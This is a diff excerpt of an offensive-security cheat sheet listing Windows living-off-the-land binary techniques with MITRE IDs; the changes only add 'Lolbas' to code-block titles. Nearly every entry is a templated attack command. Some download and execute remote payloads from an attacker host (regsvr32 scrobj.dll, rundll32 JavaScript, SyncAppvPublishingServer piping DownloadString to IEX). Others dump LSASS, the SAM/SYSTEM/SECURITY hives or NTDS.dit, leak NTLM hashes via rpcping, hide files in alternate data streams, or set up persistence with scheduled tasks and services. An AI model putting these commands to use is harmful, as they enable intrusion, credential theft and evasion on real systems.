 *Privileges: Administrator • MITRE: T1547*
 
-```cmd title:"Used for installing drivers"
+```cmd title:"Lolbas Used for installing drivers"
 pnputil.exe -i -a $file_out
 ```
 <!-- cheat
@@ -3011,7 +3011,7 @@ Executes the target XAML Browser Application (XBAP) file
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes the target XAML Browser Application (XBAP) file"
+```cmd title:"Lolbas Executes the target XAML Browser Application (XBAP) file"
 Presentationhost.exe $file_out
 ```
 <!-- cheat
@@ -3024,7 +3024,7 @@ It will download a remote payload and place it in INetCache.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"It will download a remote payload and place it in INetCache"
+```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
 Presentationhost.exe $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -3048,7 +3048,7 @@ Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Copy file.exe into the Alternate Data Stream (ADS) of file.txt"
+```cmd title:"Lolbas Copy file.exe into the Alternate Data Stream (ADS) of file.txt"
 print /D:$file_out:file.exe $file_out
 ```
 <!-- cheat
@@ -3061,7 +3061,7 @@ Copy file from source to destination
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy file from source to destination"
+```cmd title:"Lolbas Copy file from source to destination"
 print /D:$file_out $file_out
 ```
 <!-- cheat
@@ -3074,7 +3074,7 @@ Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy File.exe from a network share to the target c:\OutFolder\outfile.exe"
+```cmd title:"Lolbas Copy File.exe from a network share to the target c:\OutFolder\outfile.exe"
 print /D:$file_out \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -3097,7 +3097,7 @@ Create a ZIP file from a folder in a remote drive
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Create a ZIP file from a folder in a remote drive"
+```cmd title:"Lolbas Create a ZIP file from a folder in a remote drive"
 PrintBrm -b -d \\$lhost\$share\$file -f $file_out
 ```
 <!-- cheat
@@ -3113,7 +3113,7 @@ Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and 
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder"
+```cmd title:"Lolbas Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder"
 PrintBrm -r -f $file_out:hidden.zip -d $dir
 ```
 <!-- cheat
@@ -3134,7 +3134,7 @@ Executes command defined in the Registry. Requires 3 levels of the key structure
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Executes command defined in the Registry"
+```cmd title:"Lolbas Executes command defined in the Registry"
 provlaunch.exe LOLBin
 ```
 <!-- cheat
@@ -3154,7 +3154,7 @@ Record a user screen without creating a GUI. You should use "psr.exe /stop" to s
 
 *Privileges: User • MITRE: T1113*
 
-```cmd title:"Record a user screen without creating a GUI"
+```cmd title:"Lolbas Record a user screen without creating a GUI"
 psr.exe /start /output $file_out /sc 1 /gui 0
 ```
 <!-- cheat
@@ -3175,7 +3175,7 @@ Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Once executed, query.exe will execute quser.exe in the same folder"
+```cmd title:"Lolbas Once executed, query.exe will execute quser.exe in the same folder"
 query.exe user
 ```
 <!-- cheat
@@ -3194,7 +3194,7 @@ Loads the target .DLL specified in -d and executes the export specified in -p. O
 
 *Privileges: User, Administrator in Windows 8 • MITRE: T1218*
 
-```cmd title:"Loads the target .DLL specified in -d and executes the export specified in -p"
+```cmd title:"Lolbas Loads the target .DLL specified in -d and executes the export specified in -p"
 rasautou -d $file_out -p export_name -a a -e e
 ```
 <!-- cheat
@@ -3215,7 +3215,7 @@ Dump process by PID and create a dump file (creates files called `minidump_<PID>
 
 *Privileges: User • MITRE: T1003*
 
-```cmd title:"Dump process by PID and create a dump file (creates files called minidump_<PID>.dmp and…"
+```cmd title:"Lolbas Dump process by PID with rdrleakdiag"
 rdrleakdiag.exe /p 940 /o $dir /fullmemdmp /wait 1
 ```
 <!-- cheat
@@ -3228,7 +3228,7 @@ Dump LSASS process by PID and create a dump file (creates files called `minidump
 
 *Privileges: Administrator • MITRE: T1003.001*
 
-```cmd title:"Dump LSASS process by PID and create a dump file (creates files called minidump_<PID>.dmp and…"
+```cmd title:"Lolbas Dump LSASS by PID with rdrleakdiag"
 rdrleakdiag.exe /p 832 /o $dir /fullmemdmp /wait 1
 ```
 <!-- cheat
@@ -3241,7 +3241,7 @@ After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (crea
 
 *Privileges: Administrator • MITRE: T1003.001*
 
-```cmd title:"After dumping a process using /wait 1, subsequent dumps must use /snap (creates files called…"
+```cmd title:"Lolbas Snapshot subsequent process dump with rdrleakdiag"
 rdrleakdiag.exe /p 832 /o $dir /fullmemdmp /snap
 ```
 <!-- cheat
@@ -3262,7 +3262,7 @@ Export the target Registry key and save it to the specified .REG file within an 
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Export the target Registry key and save it to the specified .REG file within an Alternate data…"
+```cmd title:"Lolbas Reg.exe ADS #1"
 reg export HKLM\SOFTWARE\Microsoft\Evilreg $file_out:evilreg.reg
 ```
 <!-- cheat
@@ -3275,7 +3275,7 @@ Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key 
 
 *Privileges: Administrator • MITRE: T1003.002*
 
-```cmd title:"Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material"
+```cmd title:"Lolbas Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material"
 reg save HKLM\SECURITY $file_out && reg save HKLM\SYSTEM $file_out && reg save HKLM\SAM $file_out
 ```
 <!-- cheat
@@ -3298,7 +3298,7 @@ Loads the target .NET DLL file and executes the RegisterClass function.
 
 *Privileges: Local Admin • MITRE: T1218.009*
 
-```cmd title:"Loads the target .NET DLL file and executes the RegisterClass function"
+```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
 regasm.exe $file_out
 ```
 <!-- cheat
@@ -3311,7 +3311,7 @@ Loads the target .DLL file and executes the UnRegisterClass function.
 
 *Privileges: User • MITRE: T1218.009*
 
-```cmd title:"Loads the target .DLL file and executes the UnRegisterClass function"
+```cmd title:"Lolbas Loads the target .DLL file and executes the UnRegisterClass function"
 regasm.exe /U $file_out
 ```
 <!-- cheat
@@ -3331,7 +3331,7 @@ Export the target Registry key to the specified .REG file.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Export the target Registry key to the specified .REG file"
+```cmd title:"Lolbas Export the target Registry key to the specified .REG file"
 regedit /E $file_out:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
 ```
 <!-- cheat
@@ -3344,7 +3344,7 @@ Import the target .REG file into the Registry.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Import the target .REG file into the Registry"
+```cmd title:"Lolbas Import the target .REG file into the Registry"
 regedit $file_out:regfile.reg
 ```
 <!-- cheat
@@ -3365,7 +3365,7 @@ Write registry keys from data inside the Alternate data stream.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Write registry keys from data inside the Alternate data stream"
+```cmd title:"Lolbas Write registry keys from data inside the Alternate data stream"
 regini.exe $file_out:hidden.ini
 ```
 <!-- cheat
@@ -3386,7 +3386,7 @@ Load the target .DLL.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Load the target .DLL"
+```cmd title:"Lolbas Load the target .DLL"
 Register-cimprovider -path $file_out
 ```
 <!-- cheat
@@ -3409,7 +3409,7 @@ Loads the target .NET DLL file and executes the RegisterClass function.
 
 *Privileges: User • MITRE: T1218.009*
 
-```cmd title:"Loads the target .NET DLL file and executes the RegisterClass function"
+```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
 regsvcs.exe $file_out
 ```
 <!-- cheat
@@ -3422,7 +3422,7 @@ Loads the target .NET DLL file and executes the RegisterClass function.
 
 *Privileges: Local Admin • MITRE: T1218.009*
 
-```cmd title:"Loads the target .NET DLL file and executes the RegisterClass function"
+```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
 regsvcs.exe $file_out
 ```
 <!-- cheat
@@ -3443,7 +3443,7 @@ Execute the specified remote .SCT script with scrobj.dll.
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute the specified remote .SCT script with scrobj.dll"
+```cmd title:"Lolbas Execute the specified remote .SCT script with scrobj.dll"
 regsvr32 /s /n /u /i:$scheme://$lhost:$lport/$file scrobj.dll
 ```
 <!-- cheat
@@ -3459,7 +3459,7 @@ Execute the specified local .SCT script with scrobj.dll.
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute the specified local .SCT script with scrobj.dll"
+```cmd title:"Lolbas Execute the specified local .SCT script with scrobj.dll"
 regsvr32.exe /s /u /i:$file_out scrobj.dll
 ```
 <!-- cheat
@@ -3472,7 +3472,7 @@ Execute the specified remote .SCT script with scrobj.dll.
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute the specified remote .SCT script with scrobj.dll"
+```cmd title:"Lolbas Execute the specified remote .SCT script with scrobj.dll"
 regsvr32 /s /n /u /i:$scheme://$lhost:$lport/$file scrobj.dll
 ```
 <!-- cheat
@@ -3488,7 +3488,7 @@ Execute the specified local .SCT script with scrobj.dll.
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute the specified local .SCT script with scrobj.dll"
+```cmd title:"Lolbas Execute the specified local .SCT script with scrobj.dll"
 regsvr32.exe /s /u /i:$file_out scrobj.dll
 ```
 <!-- cheat
@@ -3501,7 +3501,7 @@ Execute code in a DLL. The code must be inside the exported function `DllRegiste
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute code in a DLL. The code must be inside the exported function DllRegisterServer"
+```cmd title:"Lolbas Execute code in a DLL. The code must be inside the exported function DllRegisterServer"
 regsvr32.exe /s $file_out
 ```
 <!-- cheat
@@ -3514,7 +3514,7 @@ Execute code in a DLL. The code must be inside the exported function `DllUnRegis
 
 *Privileges: User • MITRE: T1218.010*
 
-```cmd title:"Execute code in a DLL. The code must be inside the exported function DllUnRegisterServer"
+```cmd title:"Lolbas Execute code in a DLL. The code must be inside the exported function DllUnRegisterServer"
 regsvr32.exe /u /s $file_out
 ```
 <!-- cheat
@@ -3535,7 +3535,7 @@ Copy .cab file to destination
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy .cab file to destination"
+```cmd title:"Lolbas Copy .cab file to destination"
 replace.exe $file_out $dir /A
 ```
 <!-- cheat
@@ -3549,7 +3549,7 @@ Download/Copy executable to specified folder
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download/Copy executable to specified folder"
+```cmd title:"Lolbas Download/Copy executable to specified folder"
 replace.exe \\$lhost\$share\$file $dir /A
 ```
 <!-- cheat
@@ -3573,7 +3573,7 @@ Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, 
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Once executed, reset.exe will execute rwinsta.exe in the same folder"
+```cmd title:"Lolbas Once executed, reset.exe will execute rwinsta.exe in the same folder"
 reset.exe session
 ```
 <!-- cheat
@@ -3593,7 +3593,7 @@ Send a RPC test connection to the target server (-s) and force the NTLM hash to 
 
 *Privileges: User • MITRE: T1003*
 
-```cmd title:"Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the…"
+```cmd title:"Lolbas Rpcping.exe Credentials #1"
 rpcping -s $lhost -e 1234 -a privacy -u NTLM
 ```
 <!-- cheat
@@ -3606,7 +3606,7 @@ Trigger an authenticated RPC call to the target server (/s) that could be relaye
 
 *Privileges: User • MITRE: T1187*
 
-```cmd title:"Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged…"
+```cmd title:"Lolbas Rpcping.exe Credentials #2"
 rpcping /s $lhost /e 9997 /a connect /u NTLM
 ```
 <!-- cheat
@@ -3627,7 +3627,7 @@ First part should be a DLL file (any extension accepted), EntryPoint should be t
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"First part should be a DLL file (any extension accepted), EntryPoint should be the name of the…"
+```cmd title:"Lolbas Rundll32.exe Execute #1"
 rundll32.exe $file_out,EntryPoint
 ```
 <!-- cheat
@@ -3640,7 +3640,7 @@ Execute a DLL from an SMB share. EntryPoint is the name of the entry point in th
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute a DLL from an SMB share"
+```cmd title:"Lolbas Execute a DLL from an SMB share"
 rundll32.exe \\$lhost\$share\$file,EntryPoint
 ```
 <!-- cheat
@@ -3655,7 +3655,7 @@ Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript s
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script"
+```cmd title:"Lolbas Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script"
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$scheme://$lhost:$lport/$file")
 ```
 <!-- cheat
@@ -3671,7 +3671,7 @@ Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)"
 rundll32 "$file_out:ADSDLL.dll",DllMain
 ```
 <!-- cheat
@@ -3684,7 +3684,7 @@ Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID"
+```cmd title:"Lolbas Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID"
 rundll32.exe -sta $clsid
 ```
 <!-- cheat
@@ -3704,7 +3704,7 @@ Launches the specified exe. Prerequisites: (1) diagtrack_action_output environme
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Launches the specified exe"
+```cmd title:"Lolbas Launches the specified exe"
 runexehelper.exe $file_out
 ```
 <!-- cheat
@@ -3725,7 +3725,7 @@ Executes a Run Once Task that has been configured in the registry.
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Executes a Run Once Task that has been configured in the registry"
+```cmd title:"Lolbas Executes a Run Once Task that has been configured in the registry"
 Runonce.exe /AlternateShellStartup
 ```
 <!-- cheat
@@ -3745,7 +3745,7 @@ Execute the PowerShell script with .txt extension
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute the PowerShell script with .txt extension"
+```cmd title:"Lolbas Execute the PowerShell script with .txt extension"
 runscripthelper.exe surfacecheck \\?\$file_out $dir
 ```
 <!-- cheat
@@ -3767,7 +3767,7 @@ Creates a new service and executes the file stored in the ADS.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Creates a new service and executes the file stored in the ADS"
+```cmd title:"Lolbas Creates a new service and executes the file stored in the ADS"
 sc create evilservice binPath="\"$ads_file" /c echo works > \"$ads_file"" DisplayName= "evilservice" start= auto\ & sc start evilservice
 ```
 <!-- cheat
@@ -3780,7 +3780,7 @@ Modifies an existing service and executes the file stored in the ADS.
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Modifies an existing service and executes the file stored in the ADS"
+```cmd title:"Lolbas Modifies an existing service and executes the file stored in the ADS"
 sc config $existingservicename binPath="\"$ads_file" /c echo works > \"$ads_file"" & sc start $existingservicename
 ```
 <!-- cheat
@@ -3802,7 +3802,7 @@ Create a recurring task to execute every minute.
 
 *Privileges: User • MITRE: T1053.005*
 
-```cmd title:"Create a recurring task to execute every minute"
+```cmd title:"Lolbas Create a recurring task to execute every minute"
 schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "$cmd"
 ```
 <!-- cheat
@@ -3815,7 +3815,7 @@ Create a scheduled task on a remote computer for persistence/lateral movement
 
 *Privileges: Administrator • MITRE: T1053.005*
 
-```cmd title:"Create a scheduled task on a remote computer for persistence/lateral movement"
+```cmd title:"Lolbas Create a scheduled task on a remote computer for persistence/lateral movement"
 schtasks /create /s targetmachine /tn "MyTask" /tr "$cmd" /sc daily
 ```
 <!-- cheat
@@ -3836,7 +3836,7 @@ Executes executable
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes executable"
+```cmd title:"Lolbas Executes executable"
 Scriptrunner.exe -appvscript $file_out
 ```
 <!-- cheat
@@ -3849,7 +3849,7 @@ Executes cmd file from remote server
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes cmd file from remote server"
+```cmd title:"Lolbas Executes cmd file from remote server"
 ScriptRunner.exe -appvscript \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -3871,7 +3871,7 @@ Sets the resolution and then launches 'choice' command from the working director
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Sets the resolution and then launches 'choice' command from the working directory"
+```cmd title:"Lolbas Sets the resolution and then launches 'choice' command from the working directory"
 setres.exe -w 800 -h 600
 ```
 <!-- cheat
@@ -3891,7 +3891,7 @@ Execute file specified in %COMSPEC%
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute file specified in %COMSPEC%"
+```cmd title:"Lolbas Execute file specified in %COMSPEC%"
 SettingSyncHost -LoadAndRunDiagScript $file_out
 ```
 <!-- cheat
@@ -3904,7 +3904,7 @@ Execute a batch script in the background (no window ever pops up) which can be s
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute a batch script in the background (no window ever pops up) which can be subverted to running…"
+```cmd title:"Lolbas SettingSyncHost.exe Execute #2"
 SettingSyncHost -LoadAndRunDiagScriptNoCab $file_out
 ```
 <!-- cheat
@@ -3924,7 +3924,7 @@ Spawns ssh.exe which in turn spawns the specified command line. See also this pr
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Spawns ssh.exe which in turn spawns the specified command line"
+```cmd title:"Lolbas Spawns ssh.exe which in turn spawns the specified command line"
 sftp -o ProxyCommand="$cmd" .
 ```
 <!-- cheat
@@ -3945,7 +3945,7 @@ Launch sigverif.exe GUI, click 'Advanced', specify arbitrary executable path as 
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Launch sigverif.exe GUI, click 'Advanced', specify arbitrary executable path as 'log file name',…"
+```cmd title:"Lolbas Sigverif.exe Execute"
 sigverif.exe
 ```
 <!-- cheat
@@ -3964,7 +3964,7 @@ Executes specified command on host machine. The prompt for password can be elimi
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes specified command on host machine"
+```cmd title:"Lolbas Executes specified command on host machine"
 ssh localhost "$cmd"
 ```
 <!-- cheat
@@ -3977,7 +3977,7 @@ Executes specified command from ssh.exe
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Executes specified command from ssh.exe"
+```cmd title:"Lolbas Executes specified command from ssh.exe"
 ssh -o ProxyCommand="$cmd" .
 ```
 <!-- cheat
@@ -3998,7 +3998,7 @@ Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.e
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if…"
+```cmd title:"Lolbas Stordiag.exe Execute #1"
 stordiag.exe
 ```
 <!-- cheat
@@ -4010,7 +4010,7 @@ Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if st
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is…"
+```cmd title:"Lolbas Stordiag.exe Execute #2"
 stordiag.exe
 ```
 <!-- cheat
@@ -4030,7 +4030,7 @@ Example command on how inject Powershell code into the process
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Example command on how inject Powershell code into the process"
+```cmd title:"Lolbas Example command on how inject Powershell code into the process"
 SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/$file') | IEX"
 ```
 <!-- cheat
@@ -4054,7 +4054,7 @@ Compress one or more files to an alternate data stream (ADS).
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Compress one or more files to an alternate data stream (ADS)"
+```cmd title:"Lolbas Compress one or more files to an alternate data stream (ADS)"
 tar -cf $file_out:ads $dir
 ```
 <!-- cheat
@@ -4068,7 +4068,7 @@ Decompress a compressed file from an alternate data stream (ADS).
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Decompress a compressed file from an alternate data stream (ADS)"
+```cmd title:"Lolbas Decompress a compressed file from an alternate data stream (ADS)"
 tar -xf $file_out:ads
 ```
 <!-- cheat
@@ -4081,7 +4081,7 @@ Extracts archive.tar from the remote (internal) host to the current host.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Extracts archive.tar from the remote (internal) host to the current host"
+```cmd title:"Lolbas Extracts archive.tar from the remote (internal) host to the current host"
 tar -xf \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -4104,7 +4104,7 @@ Execute a program using ttdinject.exe. Requires administrator privileges. A log 
 
 *Privileges: Administrator • MITRE: T1127*
 
-```cmd title:"Execute a program using ttdinject.exe"
+```cmd title:"Lolbas Execute a program using ttdinject.exe"
 TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "$file_out"
 ```
 <!-- cheat
@@ -4117,7 +4117,7 @@ Execute a program using ttdinject.exe. Requires administrator privileges. A log 
 
 *Privileges: Administrator • MITRE: T1127*
 
-```cmd title:"Execute a program using ttdinject.exe"
+```cmd title:"Lolbas Execute a program using ttdinject.exe"
 ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "$file_out"
 ```
 <!-- cheat
@@ -4138,7 +4138,7 @@ Execute specified executable from tttracer.exe. Requires administrator privilege
 
 *Privileges: Administrator • MITRE: T1127*
 
-```cmd title:"Execute specified executable from tttracer.exe. Requires administrator privileges"
+```cmd title:"Lolbas Execute specified executable from tttracer.exe. Requires administrator privileges"
 tttracer.exe $file_out
 ```
 <!-- cheat
@@ -4151,7 +4151,7 @@ Dumps process using tttracer.exe. Requires administrator privileges
 
 *Privileges: Administrator • MITRE: T1003*
 
-```cmd title:"Dumps process using tttracer.exe. Requires administrator privileges"
+```cmd title:"Lolbas Dumps process using tttracer.exe. Requires administrator privileges"
 TTTracer.exe -dumpFull -attach $pid
 ```
 <!-- cheat
@@ -4172,7 +4172,7 @@ Allows an attacker to copy a target binary to a controlled directory and modify 
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432'…"
+```cmd title:"Lolbas Unregmp2.exe Execute"
 rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
 ```
 <!-- cheat
@@ -4196,7 +4196,7 @@ Binary file used by .NET to compile Visual Basic code to an executable.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Binary file used by .NET to compile Visual Basic code to an executable"
+```cmd title:"Lolbas Binary file used by .NET to compile Visual Basic code to an executable"
 vbc.exe /target:exe $file_out
 ```
 <!-- cheat
@@ -4209,7 +4209,7 @@ Binary file used by .NET to compile Visual Basic code to an executable.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Binary file used by .NET to compile Visual Basic code to an executable"
+```cmd title:"Lolbas Binary file used by .NET to compile Visual Basic code to an executable"
 vbc -reference:Microsoft.VisualBasic.dll $file_out
 ```
 <!-- cheat
@@ -4230,7 +4230,7 @@ Used to verify a COM object before it is instantiated by Windows Explorer
 
 *Privileges: User • MITRE: T1218.012*
 
-```cmd title:"Used to verify a COM object before it is instantiated by Windows Explorer"
+```cmd title:"Lolbas Used to verify a COM object before it is instantiated by Windows Explorer"
 verclsid.exe /S /C $clsid
 ```
 <!-- cheat
@@ -4251,7 +4251,7 @@ Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice
 
 *Privileges: Administrator • MITRE: T1218*
 
-```cmd title:"Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice"
+```cmd title:"Lolbas Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice"
 wab.exe
 ```
 <!-- cheat
@@ -4270,7 +4270,7 @@ Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)
 
 *Privileges: Administrator, Backup Operators, SeBackupPrivilege • MITRE: T1003.003*
 
-```cmd title:"Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)"
+```cmd title:"Lolbas Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)"
 wbadmin start backup -backupTarget:$dir -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
 ```
 <!-- cheat
@@ -4283,7 +4283,7 @@ Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadm
 
 *Privileges: Administrator, Backup Operators, SeBackupPrivilege • MITRE: T1003.003*
 
-```cmd title:"Restore a version of NTDS.dit and SYSTEM hive into file path"
+```cmd title:"Lolbas Restore a version of NTDS.dit and SYSTEM hive into file path"
 wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:$dir -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
 ```
 <!-- cheat
@@ -4304,7 +4304,7 @@ Execute arbitary commands through WMI through a GUI managment interface for Web 
 
 *Privileges: Any • MITRE: T1047*
 
-```cmd title:"Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise…"
+```cmd title:"Lolbas wbemtest.exe Execute"
 wbemtest.exe
 ```
 <!-- cheat
@@ -4323,7 +4323,7 @@ Downloads a file from the web address specified in .yml file and executes it on 
 
 *Privileges: Local Administrator - required to enable local manifest setting • MITRE: T1105*
 
-```cmd title:"Downloads a file from the web address specified in .yml file and executes it on the system"
+```cmd title:"Lolbas Downloads a file from the web address specified in .yml file and executes it on the system"
 winget.exe install --manifest $file_out
 ```
 <!-- cheat
@@ -4336,7 +4336,7 @@ Download and install any software from the Microsoft Store using its name or Sto
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and install any software from the Microsoft Store using its name or Store ID, even if the…"
+```cmd title:"Lolbas winget.exe Download #2"
 winget.exe install --accept-package-agreements -s msstore $name_or_id
 ```
 <!-- cheat
@@ -4349,7 +4349,7 @@ Download and install any software from the Microsoft Store using its name or Sto
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Download and install any software from the Microsoft Store using its name or Store ID, even if the…"
+```cmd title:"Lolbas winget.exe AWL Bypass #3"
 winget.exe install --accept-package-agreements -s msstore $name_or_id
 ```
 <!-- cheat
@@ -4369,7 +4369,7 @@ Execute executable with wlrmdr.exe as parent process
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute executable with wlrmdr.exe as parent process"
+```cmd title:"Lolbas Execute executable with wlrmdr.exe as parent process"
 wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u $file_out
 ```
 <!-- cheat
@@ -4390,7 +4390,7 @@ Execute a .EXE file stored as an Alternate Data Stream (ADS)
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Execute a .EXE file stored as an Alternate Data Stream (ADS)"
+```cmd title:"Lolbas Execute a .EXE file stored as an Alternate Data Stream (ADS)"
 wmic.exe process call create "$file_out:program.exe"
 ```
 <!-- cheat
@@ -4403,7 +4403,7 @@ Execute calc from wmic
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute calc from wmic"
+```cmd title:"Lolbas Execute calc from wmic"
 wmic.exe process call create "$cmd"
 ```
 <!-- cheat
@@ -4416,7 +4416,7 @@ Execute evil.exe on the remote system.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute evil.exe on the remote system"
+```cmd title:"Lolbas Execute evil.exe on the remote system"
 wmic.exe /node:"$lhost" process call create "$cmd"
 ```
 <!-- cheat
@@ -4430,7 +4430,7 @@ Create a volume shadow copy of NTDS.dit that can be copied.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Create a volume shadow copy of NTDS.dit that can be copied"
+```cmd title:"Lolbas Create a volume shadow copy of NTDS.dit that can be copied"
 wmic.exe process get brief /format:"$scheme://$lhost:$lport/$file"
 ```
 <!-- cheat
@@ -4446,7 +4446,7 @@ Executes JScript or VBScript embedded in the target remote XSL stylsheet.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes JScript or VBScript embedded in the target remote XSL stylsheet"
+```cmd title:"Lolbas Executes JScript or VBScript embedded in the target remote XSL stylsheet"
 wmic.exe process get brief /format:"\\$lhost\$share\$file"
 ```
 <!-- cheat
@@ -4461,7 +4461,7 @@ Copy file from source to destination.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Copy file from source to destination"
+```cmd title:"Lolbas Copy file from source to destination"
 wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
 ```
 <!-- cheat
@@ -4480,7 +4480,7 @@ Execute `control.exe` in the current working directory
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute control.exe in the current working directory"
